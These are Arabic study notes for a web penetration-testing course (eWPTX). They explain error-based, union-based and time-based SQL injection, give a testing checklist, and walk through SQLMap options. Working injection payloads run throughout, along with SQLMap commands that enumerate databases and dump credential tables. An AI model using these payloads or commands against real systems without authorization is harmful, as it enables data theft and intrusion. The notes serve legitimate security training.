# 🔴 Advanced Injection Attacks — شرح تفصيلي (Slides 51–115)

---

## 📌 الفكرة العامة لهذا الجزء

الـ 65 slide دول بيغطوا **3 محاور رئيسية:**

1. **الشرح التفصيلي لكل نوع SQLi** — Error-Based, Union-Based, Time-Based مع الـ methodology كاملة
2. **منهجية الاختبار الكاملة** (SQLi Testing Methodology) — الـ checklist اللي بتشتغل بيه في أي target
3. **SQLMap من الأساسيات للـ Advanced** — كل option وكل flag وامتى تستخدم إيه

---

## 📖 الشرح التفصيلي

---

### 🔷 1. Error-Based SQL Injection — التفصيل الكامل (Slides 53–61)

#### ما هو Error-Based SQLi؟

**Error-Based SQL Injection** (الحقن المبني على رسائل الخطأ)
هو نوع من الـ In-Band SQLi.

الـ attacker بيحقن payload عن عمد بيخلي الـ database تطلع **error message** (رسالة خطأ) — وجوه الرسالة دي بيكون فيها معلومات عن هيكل الـ database.

#### ليه بترجع الـ database معلومات في الـ error؟

الـ databases بتصمم رسائل الخطأ بتاعتها عشان تساعد الـ developers في الـ debugging (تصحيح الأخطاء) — فالرسالة بتقول اسم الـ table، الـ column، ونوع البيانات.

لكن لو الـ developer نسي يخفي الـ errors في الـ production — المهاجم يستفيد منها.

#### منهجية Error-Based SQLi (خطوة خطوة)

**الخطوة 1: تحديد الـ vulnerable parameter**

ابعت `'` في أي input وشوف لو طلع error.

```
الـ URL: http://site.com/product.php?id=1'
الـ Error: You have an error in your SQL syntax near ''' at line 1
```

الـ error ده بيقول:

- الـ database هي **MySQL**
- الـ query بتتعامل مع الـ id كـ string

**الخطوة 2: حقن payload لاستخراج معلومات**

```sql
-- استخراج اسم الـ database الحالية
1' AND extractvalue(1, concat(0x3a, database())) --

-- استخراج نسخة الـ database
1' AND extractvalue(1, concat(0x3a, version())) --

-- استخراج اسم الـ user الحالي
1' AND extractvalue(1, concat(0x3a, user())) --
```

**الخطوة 3: قراءة الـ error واستخراج المعلومات**

```
Error: XPATH syntax error: ':mydb'
```

الـ `:mydb` ده اسم الـ database اللي مخفية جوه الـ error message!

**الخطوة 4: استغلال المعلومات**

بعد ما عرفت اسم الـ database، تقدر تستخرج أسماء الـ tables، الـ columns، وبعدين الـ data نفسها.

#### الـ flow كامل

```
المهاجم → ' payload → التطبيق → Database
                                    ↓
                              بترجع ERROR
                                    ↓
                    Error: ':tablename' أو ':password_hash'
                                    ↓
                       المهاجم بيقرأ المعلومات من الـ error
```

> **نقطة مهمة:** مش كل الـ databases بترجع errors بنفس الطريقة. MySQL بتستخدم `extractvalue()` أو `updatexml()`. MSSQL بيستخدم `convert()`.

---

### 🔷 2. Union-Based SQL Injection — التفصيل الكامل (Slides 62–69)

#### ما هو Union-Based SQLi؟

**Union-Based SQL Injection** (الحقن المبني على عامل UNION) هو النوع الأقوى في الـ In-Band SQLi.

الـ UNION operator بيسمح بدمج نتائج `SELECT` queries متعددة في نتيجة واحدة.

**بدل ما الصفحة تعرض البيانات الأصلية — هتعرض البيانات اللي أنت عايزها.**

#### الشرط الأساسي للـ UNION

عشان الـ UNION يشتغل لازم:

1. **نفس عدد الـ columns** في كل الـ SELECT statements.
2. **أنواع بيانات متوافقة** في كل column.

```sql
-- الـ query الأصلية بترجع عمودين: id, name
SELECT id, name FROM users WHERE id = '1'

-- الـ injection لازم يكون فيه عمودين برضو
' UNION SELECT credit_card_number, 'hacked' FROM credit_cards --
```

#### منهجية Union-Based SQLi (خطوة خطوة)

**الخطوة 1: تحديد عدد الـ columns (Column Count)**

بتستخدم `ORDER BY` لتحديد عدد الـ columns:

```sql
' ORDER BY 1 --    ← شغال (في على الأقل column واحد)
' ORDER BY 2 --    ← شغال
' ORDER BY 3 --    ← Error! يعني في 2 columns بس
```

أو بتستخدم `UNION SELECT NULL`:

```sql
' UNION SELECT NULL --          ← Error لو مش 1 column
' UNION SELECT NULL,NULL --     ← Error لو مش 2 columns
' UNION SELECT NULL,NULL,NULL --← شغال! يعني في 3 columns
```

**الخطوة 2: تحديد الـ columns القابلة للعرض (Printable Columns)**

مش كل الـ columns بتظهر في الـ response، فبتحدد أيهم بيظهر:

```sql
' UNION SELECT 'a',NULL --    ← لو ظهر 'a' في الصفحة → Column 1 printable
' UNION SELECT NULL,'a' --    ← لو ظهر 'a' في الصفحة → Column 2 printable
```

**الخطوة 3: استخراج البيانات**

بعد ما عرفت العدد وأي column printable:

```sql
-- استخراج اسم الـ database
' UNION SELECT database(),NULL --

-- استخراج أسماء الـ tables
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database() --

-- استخراج أسماء الـ columns
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --

-- استخراج الـ data الفعلية
' UNION SELECT username,password FROM users --
```

#### مثال كامل من البداية للنهاية

```
الـ URL: http://site.com/product.php?id=1

الـ query الأصلية:
SELECT id, name FROM products WHERE id = '1'

Step 1: ' ORDER BY 3 -- → Error → في 2 columns

Step 2: ' UNION SELECT 'test',NULL -- → 'test' ظهر في الصفحة → Column 1 printable

Step 3: ' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database() --
النتيجة في الصفحة: users, products, orders

Step 4: ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --
النتيجة: id, username, password, email

Step 5: ' UNION SELECT username,password FROM users --
النتيجة: admin:5f4dcc3b5aa765d61d8327de (MD5 hash!)
```

---

### 🔷 3. Time-Based SQL Injection — التفصيل الكامل (Slides 72–77)

#### ما هو Time-Based SQLi؟

**Time-Based SQL Injection** (الحقن المبني على التأخير الزمني) هو نوع من الـ Blind SQLi.

مفيش أي data بترجع في الـ response — لكن المهاجم بيستخدم الـ **response time** (وقت الاستجابة) كـ "لغة سرية" مع الـ database.

**المنطق:** لو الـ query اشتغلت وطلعت True → الـ database هتنام X ثواني → نعرف الإجابة صح.

#### الـ SLEEP() function

```sql
-- MySQL
SLEEP(5)     -- ينام 5 ثواني

-- MSSQL
WAITFOR DELAY '0:0:5'    -- ينام 5 ثواني

-- PostgreSQL
pg_sleep(5)    -- ينام 5 ثواني
```

#### مثال من الـ PPTX

```
الـ query الأصلية:
SELECT * FROM users WHERE username = '[input]' AND password = '[pass]'

الـ payload:
' OR SLEEP(5) -- '

الـ query بعد الـ injection:
SELECT * FROM users WHERE username = '' OR SLEEP(5) -- ' AND password = '...'
```

لو الصفحة اتأخرت **5 ثواني** → الـ SLEEP اشتغل → الـ injection موجود.

#### استخدام Time-Based لاستخراج البيانات (حرف حرف)

```sql
-- هل الحرف الأول من اسم الـ database هو 'm'؟
' OR IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0) --

-- لو اتأخر 5 ثواني → نعم، الحرف 'm'
-- لو استجاب فوراً → لأ، جرب حرف تاني

-- هل الحرف التاني هو 'y'؟
' OR IF(SUBSTRING(database(),2,1)='y', SLEEP(5), 0) --
```

هكذا حرف حرف تعرف اسم الـ database اللي هو `mysql` مثلاً.

> **الـ Time-Based بطيء جداً** — لاستخراج password طويلة ممكن يأخذ ساعات. في الـ real world بتستخدمه بس لتأكيد وجود الثغرة، وبعدين تستخدم SQLMap عشان يعمل الاستخراج تلقائياً.

---

### 🔷 4. منهجية اختبار الـ SQLi الكاملة (Slides 78–81)

#### الـ 9 خطوات (Testing Methodology)

ده الـ framework اللي بتشتغل بيه على أي target:

**الخطوة 1: Entry Point Detection (تحديد نقاط الدخول)**

- حدد كل الـ inputs اللي بتتعامل مع الـ database.
- Form fields, URL parameters, headers, cookies.
- افهم منطق التطبيق وتوقع هيكل الـ queries.

**الخطوة 2: DBMS Identification (تحديد نوع قاعدة البيانات)**

- كل DBMS بيرد بشكل مختلف على نفس الـ payload.
- من رسالة الخطأ بتعرف MySQL، MSSQL، Oracle، إلخ.

**الخطوة 3: Initial Testing (الاختبار الأولي)**

```sql
' OR '1'='1    ← لو الصفحة اتغيرت أو logged in → vulnerable
' AND '1'='2   ← لو الصفحة اختفت أو error → vulnerable
```

**الخطوة 4: Error-Based Testing**

```sql
'   ← يكسر الـ query ويطلع error
```

شوف نوع الـ error → تعرف الـ DBMS.

**الخطوة 5: Blind SQLi Testing**

```sql
-- Boolean-Based:
' AND 1=1 --    ← True → الصفحة طبيعية
' AND 1=2 --    ← False → الصفحة اختفت أو اتغيرت

-- Time-Based:
' OR IF(1=1, SLEEP(5), 0) --    ← لو اتأخر → vulnerable
```

**الخطوة 6: Union-Based Testing**

```sql
-- تحديد عدد الـ columns:
UNION SELECT NULL --
UNION SELECT NULL,NULL --
UNION SELECT NULL,NULL,NULL --   ← حتى يشتغل

-- استخراج البيانات:
UNION SELECT username, password FROM users --
```

**الخطوة 7: Advanced Testing**

- **OOB Testing:** تستخدم Burp Collaborator أو dnslog.cn عشان تتحقق من الـ DNS callbacks.
- **Second-Order Testing:** تحقن payload بيتخزن ويتنفذ لاحقاً في query تانية.

**الخطوة 8: Automated Testing**

- SQLMap, Burp Suite, OWASP ZAP.
- **مهم:** اتأكد من النتائج يدوياً عشان تتجنب false positives (نتائج غلط).

**الخطوة 9: Validation and Exploitation**

- تأكد من إمكانية الاستغلال باستخراج data فعلية.
- وثق الـ impact وقدم التوصيات.

#### الـ SQLi Checklist (احتفظ بيه في Obsidian)

|الخطوة|الوصف|مثال على الـ Payload|
|---|---|---|
|Identify Input Points|حدد كل الـ inputs|Form fields, URL params, cookies|
|Basic Payload Testing|اختبر بـ payloads أساسية|`' OR '1'='1 --`|
|Error-Based Testing|خلي الـ DB تطلع error|`'` أو `' AND extractvalue(...)`|
|Boolean-Based Testing|أسئلة صح/غلط|`' AND 1=1 --` و `' AND 1=2 --`|
|Time-Based Testing|اختبر بالتأخير|`' OR IF(1=1, SLEEP(5), 0) --`|
|Union-Based Testing|عد الـ columns واستخرج|`UNION SELECT NULL,NULL --`|
|OOB Testing|DNS/HTTP callbacks|Burp Collaborator, dnslog.cn|
|Second-Order Testing|Payloads متأخرة التنفيذ|حقن في persistent fields|
|Tool-Based Scanning|أدوات تلقائية|SQLMap, OWASP ZAP|

---

### 🔷 5. SQLMap — من الأساسيات للـ Advanced (Slides 82–115)

#### ما هو SQLMap؟

**SQLMap** هو أشهر open-source tool لاكتشاف واستغلال ثغرات الـ SQL Injection تلقائياً.

- بيدعم كل أنواع الـ SQLi: Error-based, Union-based, Boolean-based, Time-based, OOB.
- بيدعم كل الـ databases الكبيرة: MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MariaDB.
- مصدره: `https://sqlmap.org`

#### قاعدة ذهبية قبل SQLMap

> **اختبر يدوياً الأول — SQLMap بعدين.**

لو رحت فوراً لـ SQLMap من غير ما تفهم الـ vulnerability:

- ممكن يختار strategy غلط وياخد ساعات بدل دقايق.
- ممكن يـ crash الـ service عند الـ client.
- مش هتفهم النتائج اللي بيطلعها.

#### كيف بيشتغل SQLMap (الـ Workflow)

```
1. يشوف الـ URL ويحدد الـ injection points
2. يبعت payloads اختبار زي: ' OR '1'='1
3. يحلل الـ response
4. يعمل Fingerprint للـ DBMS
5. يختار الـ injection technique الأنسب
6. يستخرج الـ data
7. (اختياري) يطلع OS shell لو ممكن
```

---

#### الـ Basic Syntax (الصياغة الأساسية)

```bash
sqlmap -u <URL> -p <parameter> [options]
```

**مثال:**

```bash
sqlmap -u "http://example.com/product.php?id=1"
```

- `-u` → الـ URL المستهدف (URL — يو-آر-إل)
- `-p` → اسم الـ parameter اللي هتختبره (اختياري لو واحد)

---

#### اختبار POST Requests (طلبات POST)

لو الـ form بتبعت POST request:

```bash
sqlmap -u "http://example.com/login.php" --data="username=admin&password=123"
```

- `--data` → بيانات الـ POST body

---

#### Database Enumeration (تعداد قاعدة البيانات)

##### 1. استخراج الـ Banner (أول خطوة دايماً)

**Banner** (بانر) = معلومات تعريفية عن الـ database (النسخة، الاسم، إلخ).

```bash
sqlmap -u "http://example.com/product.php?id=1" --banner
```

**الناتج:**

```
[INFO] The back-end DBMS is MySQL version 5.7.38
```

ده مهم جداً لتقرير الـ pentest عشان بيثبت إن الثغرة قابلة للاستغلال.

##### 2. استعراض الـ Users

```bash
sqlmap -u "http://example.com/product.php?id=1" --users
```

##### 3. معرفة لو الـ user الحالي Admin

```bash
sqlmap -u "http://example.com/product.php?id=1" --is-dba
```

**DBA** = Database Administrator (مدير قاعدة البيانات) — لو `True` يعني عندك صلاحيات كاملة.

##### 4. استعراض الـ Databases

```bash
sqlmap -u "http://example.com/product.php?id=1" --dbs
```

**الناتج:**

```
Available databases:
[*] information_schema
[*] users_db
[*] shop_db
```

##### 5. استعراض الـ Tables

```bash
sqlmap -u "http://example.com/product.php?id=1" -D users_db --tables
```

- `-D users_db` → حدد الـ database اللي عايز تشوف tables فيها

**الناتج:**

```
Tables in users_db:
[*] user_credentials
[*] user_profiles
```

##### 6. استعراض الـ Columns

```bash
sqlmap -u "http://example.com/product.php?id=1" -D users_db -T user_credentials --columns
```

- `-T user_credentials` → حدد الـ table

##### 7. Dump البيانات (استخراج المحتوى)

```bash
sqlmap -u "http://example.com/product.php?id=1" -D users_db -T user_credentials --dump
```

**الناتج:**

```
+----------+-----------+
| username | password  |
+----------+-----------+
| admin    | pass123   |
| user1    | secret42  |
+----------+-----------+
```

##### 8. Dump كل حاجة دفعة واحدة

```bash
sqlmap -u "http://example.com/product.php?id=1" --dump-all
```

> **تحذير:** دي عملية كبيرة — ممكن تاخد وقت طويل جداً وتكون noisy على الـ logs.

---

#### Authentication — استخدام الـ Cookies

لو الصفحة بتحتاج login عشان تعمل test:

```bash
sqlmap -u "http://example.com/product.php?id=1" --cookie="PHPSESSID=abc123"
```

- `--cookie` → بتحط الـ session cookie اللي اخدته من Burp بعد الـ login

---

#### جدول كل الـ Options المهمة

##### Basic Options

|الـ Option|الوصف|
|---|---|
|`-u, --url`|الـ URL المستهدف|
|`--data`|بيانات الـ POST|
|`-p`|الـ parameter المستهدف|
|`--fingerprint`|تحديد نوع ونسخة الـ DBMS|
|`--tamper`|تطبيق tamper scripts لتجاوز الـ WAF|
|`--os-shell`|فتح OS shell على السيرفر|
|`--file-read`|قراءة ملفات من السيرفر|
|`--batch`|التشغيل التلقائي بدون أسئلة|
|`--cookie`|إرسال cookie مع كل request|

##### Enumeration Options

|الـ Option|الوصف|
|---|---|
|`-a, --all`|جيب كل حاجة|
|`-b, --banner`|الـ DBMS banner|
|`--dbs`|قائمة الـ databases|
|`--tables`|قائمة الـ tables|
|`--columns`|قائمة الـ columns|
|`--schema`|الهيكل الكامل للـ database|
|`--dump`|استخراج بيانات table معينة|
|`--dump-all`|استخراج كل البيانات|
|`--is-dba`|هل الـ user عنده صلاحيات DBA؟|
|`-D`|تحديد الـ database|
|`-T`|تحديد الـ table|
|`-C`|تحديد الـ columns|

---

#### SQLMap Advanced — الـ Technique Option

الـ `--technique` بيحدد أنواع الـ injection اللي هيجربها SQLMap.

|الكود|النوع|الشرح|
|---|---|---|
|`B`|Boolean-Based Blind|صح/غلط|
|`E`|Error-Based|رسائل الخطأ|
|`U`|UNION-Based|دمج الاستعلامات|
|`S`|Stacked Queries|تنفيذ أكثر من query مع بعض|
|`T`|Time-Based Blind|التأخير الزمني|
|`Q`|Inline Queries|subqueries|

**أمثلة:**

```bash
-- اختبر Boolean-Based بس:
sqlmap -u "http://example.com/product.php?id=1" --technique=B

-- اختبر Error-Based بس:
sqlmap -u "http://example.com/product.php?id=1" --technique=E

-- اختبر Union-Based وBoolean-Based بس:
sqlmap -u "http://example.com/product.php?id=1" --technique=UB
```

---

#### الـ --level و --risk Options (مهم جداً للـ eWPTX)

##### الـ --level (عمق الاختبار)

بيحدد **كم عدد الـ parameters** اللي SQLMap هيختبرها.

|Level|اللي بيختبره|
|---|---|
|`1` (Default)|فقط الـ GET/POST parameters الأساسية|
|`2`|يضيف الـ HTTP Headers: Cookie, User-Agent, Referer|
|`3`|يضيف Custom Headers وHidden Fields|

```bash
sqlmap -u "http://example.com/product.php?id=1" --level=2
-- هيختبر الـ Cookie والـ User-Agent برضو
```

##### الـ --risk (درجة الخطورة)

بيحدد **مدى خطورة** الـ payloads اللي SQLMap هيستخدمها.

|Risk|السلوك|
|---|---|
|`1` (Default)|payloads آمنة — Boolean وUnion بسيطة|
|`2`|يضيف Time-based وUNION queries أكبر|
|`3`|يضيف Stacked Queries — ممكن تأثر على الـ DB|

```bash
sqlmap -u "http://example.com/product.php?id=1" --risk=2
```

##### الجمع بينهم

```bash
sqlmap -u "http://example.com/product.php?id=1" --level=3 --risk=3
```

**ده بيعمل إيه؟**

- بيختبر كل الـ headers والـ cookies والـ hidden fields.
- بيبعت payloads خطيرة ممكن تـ crash الـ database.

**⚠️ تحذير من الـ PPTX مباشرة:**

> "Using SQLMap with high level and risk without understanding the application is **unprofessional** and will cause issues to the client's infrastructure."

**القاعدة:** استخدم `--level=3 --risk=3` فقط لو:

- أنت متأكد من نوع الثغرة يدوياً.
- الـ client وافق على aggressive testing.
- الـ environment هو test environment مش production.

---

#### استخدام Burp Request Files مع SQLMap

**أسهل طريقة وأكثرها احترافية:**

1. افتح Burp Suite وإعمل intercept.
2. ابعت الـ request اللي فيها الـ parameter المشبوه.
3. في Burp: Click Right → "Save item" → احفظه كـ `request.txt`.
4. شغل SQLMap على الملف ده:

```bash
sqlmap -r request.txt -p parameter [options]
```

**مثال على شكل الـ request.txt:**

```http
GET /product.php?id=1 HTTP/1.1
Host: example.com
Cookie: PHPSESSID=abc123
User-Agent: Mozilla/5.0
```

**ليه دي أحسن طريقة؟**

- بتضمن إن SQLMap بيبعت نفس الـ headers والـ cookies الأصلية.
- أسهل من كتابة كل flag لوحده.
- بتتجنب مشاكل الـ encoding في الـ URL.

---

## 📊 جدول المصطلحات الموحد

|English Term|المعنى بالعربي|النطق|
|---|---|---|
|Error-Based SQLi|الحقن المبني على رسائل الخطأ|إيرور-بيسد|
|Union-Based SQLi|الحقن المبني على عامل UNION|يونيون-بيسد|
|Time-Based SQLi|الحقن المبني على التأخير الزمني|تايم-بيسد|
|Boolean-Based SQLi|الحقن المبني على منطق صح/غلط|بوليان-بيسد|
|SQLMap|أداة أتمتة استغلال SQLi|إس-كيو-إل-ماب|
|Entry Point|نقطة دخول المدخلات|إنتري بوينت|
|DBMS Identification|تحديد نوع قاعدة البيانات|دي-بي-إم-إس آيدنتيفيكيشن|
|Fingerprint|تحديد هوية النظام|فينجربرينت|
|Banner|معلومات تعريفية عن الـ DB|بانر|
|--banner|خيار SQLMap لاستخراج الـ Banner|باش flag|
|--dbs|خيار استعراض قواعد البيانات|دي-بي-إس flag|
|--tables|خيار استعراض الجداول|تيبلز flag|
|--dump|خيار استخراج بيانات الجدول|دامب flag|
|--is-dba|هل المستخدم admin?|إز-دي-بي-إيه flag|
|DBA|Database Administrator|دي-بي-إيه|
|--technique|تحديد نوع الـ injection|تكنيك flag|
|--level|عمق الاختبار (1-5)|ليفل flag|
|--risk|درجة خطورة الـ payloads (1-3)|ريسك flag|
|--batch|تشغيل تلقائي بدون أسئلة|باتش flag|
|--tamper|تجاوز الـ WAF بسكريبتات|تامبر|
|--os-shell|فتح shell على السيرفر|أو-إس شيل|
|-r|تحديد ملف الـ request من Burp|داش-آر|
|POST Request|طلب HTTP بالبيانات في الـ body|بوست ريكويست|
|Cookie|ملف تعريف ارتباط يحمل الـ session|كوكي|
|PHPSESSID|معرف الـ session في PHP|بي-إتش-بي-سيس-آيدي|
|Column Count|عدد الأعمدة في الـ query|كولومن كاونت|
|ORDER BY|ترتيب النتائج — بنستخدمه لعد الـ columns|أوردر باي|
|SLEEP()|دالة التأخير في MySQL|سليب|
|WAITFOR DELAY|دالة التأخير في MSSQL|ويت-فور ديلاي|
|extractvalue()|دالة MySQL لاستخراج البيانات من الـ error|إكستراكت-فاليو|
|information_schema|قاعدة بيانات MySQL تحتوي على metadata|إنفورميشن-سكيما|
|Stacked Queries|تنفيذ أكثر من query في نفس الوقت|ستاكت كويريز|
|Second-Order SQLi|حقن يُخزن وينفذ لاحقاً|سكند-أوردر|
|False Positive|نتيجة إيجابية خاطئة من الـ tool|فولس بوزيتيف|
|Automated Testing|اختبار تلقائي بالأدوات|أوتوميتد تستينج|
|Intercepted Request|طلب HTTP محتجز من Burp|إنترسبتد ريكويست|

---

## ✅ الملخص النهائي

### الـ 3 أنواع بجملة واحدة لكل نوع

|النوع|جملة واحدة|
|---|---|
|**Error-Based**|خلي الـ DB تطلع error وجوه معلومات — اقرأ الـ error|
|**Union-Based**|اضم query تانية على الأصلية — النتيجة هتظهر في الصفحة|
|**Time-Based**|لو SLEEP(5) اشتغل وأبطأت الصفحة — عندك injection|

### SQLMap في 5 خطوات عملية

```bash
# 1. اكتشف الثغرة الأول يدوياً (ابعت ' وشوف)

# 2. بعدين اشغل SQLMap:
sqlmap -u "http://target.com/page.php?id=1" --banner

# 3. استعرض الـ databases:
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 4. استعرض الـ tables:
sqlmap -u "http://target.com/page.php?id=1" -D target_db --tables

# 5. اسرق البيانات:
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump
```

### ترتيب الأولوية عند الاختيار بين الأنواع

```
هل الـ DB بترجع error؟  → Error-Based أسرع
هل في output في الصفحة؟ → Union-Based أقوى
مفيش error ولا output؟  → Boolean-Based أو Time-Based
```

### قواعد SQLMap الذهبية (مهم للـ eWPTX)

1. **اختبر يدوياً الأول** — SQLMap للتأكيد والأتمتة، مش للاكتشاف.
2. **ابدأ بـ `--banner`** — أسرع طريقة تثبت الـ exploitation.
3. **استخدم `-r request.txt`** مع الـ Burp requests — أنظف وأدق.
4. **`--level=3 --risk=3` فقط لما تكون عارف إيه اللي بتعمله.**
5. **اتحقق يدوياً من نتائج SQLMap** — فيه false positives.